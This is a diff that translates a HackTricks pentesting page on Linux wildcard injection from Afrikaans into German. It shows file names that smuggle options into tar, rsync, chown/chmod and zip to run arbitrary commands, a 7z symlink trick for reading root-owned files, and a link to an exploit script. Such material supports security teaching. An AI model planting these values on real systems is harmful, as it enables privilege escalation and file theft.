@@ -1,14 +1,14 @@
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
@@ -16,26 +16,26 @@ Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size=
 
 ## chown, chmod
 
-Jy kan **aangee watter lêer eienaar en toestemmings jy wil kopieer vir die res van die lêers**
+Du kannst **angeben, welchen Dateibesitzer und welche Berechtigungen du für den Rest der Dateien kopieren möchtest**
 ```bash
 touch "--reference=/my/own/path/filename"
 ```
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(gecombineerde aanval)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Du kannst dies mit [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinierter Angriff)_ ausnutzen.\
+Mehr Informationen unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Tar
 
-**Voer arbitrêre opdragte uit:**
+**Führe beliebige Befehle aus:**
 ```bash
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar aanval)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Du kannst dies ausnutzen, indem du [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) verwendest _(tar-Angriff)_\
+Mehr Informationen unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## Rsync
 
-**Voer arbitrêre opdragte uit:**
+**Führe beliebige Befehle aus:**
 ```bash
 Interesting rsync option from manual:
 
@@ -46,42 +46,42 @@ Interesting rsync option from manual:
 ```bash
 touch "-e sh shell.sh"
 ```
-You can exploit this using [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _aanval)_\
-More info in [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Du kannst dies ausnutzen, indem du [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _Angriff)_\
+Mehr Informationen unter [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
 
 ## 7z
 
-In **7z** selfs met `--` voor `*` (let daarop dat `--` beteken dat die volgende invoer nie as parameters behandel kan word nie, so net lêer padhere in hierdie geval) kan jy 'n arbitrêre fout veroorsaak om 'n lêer te lees, so as 'n opdrag soos die volgende deur root uitgevoer word:
+In **7z** kannst du selbst mit `--` vor `*` (beachte, dass `--` bedeutet, dass die folgenden Eingaben nicht als Parameter behandelt werden können, sondern in diesem Fall nur als Dateipfade) einen beliebigen Fehler verursachen, um eine Datei zu lesen. Wenn also ein Befehl wie der folgende von root ausgeführt wird:
 ```bash
 7za a /backup/$filename.zip -t7z -snl -p$pass -- *
 ```
-En jy kan lêers in die gids skep waar dit uitgevoer word, jy kan die lêer `@root.txt` en die lêer `root.txt` skep wat 'n **symlink** is na die lêer wat jy wil lees:
+Und Sie können Dateien in dem Ordner erstellen, in dem dies ausgeführt wird. Sie könnten die Datei `@root.txt` und die Datei `root.txt` erstellen, die ein **symlink** zu der Datei ist, die Sie lesen möchten:
 ```bash
 cd /path/to/7z/acting/folder
 touch @root.txt
 ln -s /file/you/want/to/read root.txt
 ```
-Dan, wanneer **7z** uitgevoer word, sal dit `root.txt` behandel as 'n lêer wat die lys van lêers bevat wat dit moet saamgeperste (dit is wat die bestaan van `@root.txt` aandui) en wanneer 7z `root.txt` lees, sal dit `/file/you/want/to/read` lees en **aangesien die inhoud van hierdie lêer nie 'n lys van lêers is nie, sal dit 'n fout gooi** wat die inhoud wys.
+Dann, wenn **7z** ausgeführt wird, behandelt es `root.txt` als eine Datei, die die Liste der Dateien enthält, die es komprimieren soll (das zeigt die Existenz von `@root.txt` an), und wenn 7z `root.txt` liest, wird es `/file/you/want/to/read` lesen und **da der Inhalt dieser Datei keine Liste von Dateien ist, wird es einen Fehler ausgeben**, der den Inhalt zeigt.
 
-_Meer inligting in Write-ups van die boks CTF van HackTheBox._
+_Mehr Informationen in den Write-ups der Box CTF von HackTheBox._
 
 ## Zip
 
-**Voer arbitrêre opdragte uit:**
+**Führen Sie beliebige Befehle aus:**
 ```bash
 zip name.zip files -T --unzip-command "sh -c whoami"
 ```
 {% hint style="success" %}
-Leer & oefen AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>Unterstütze HackTricks</summary>
 
-* Kyk na die [**subskripsie planne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacking truuks deur PRs in te dien na die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
+* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.
 
 </details>
 {% endhint %}
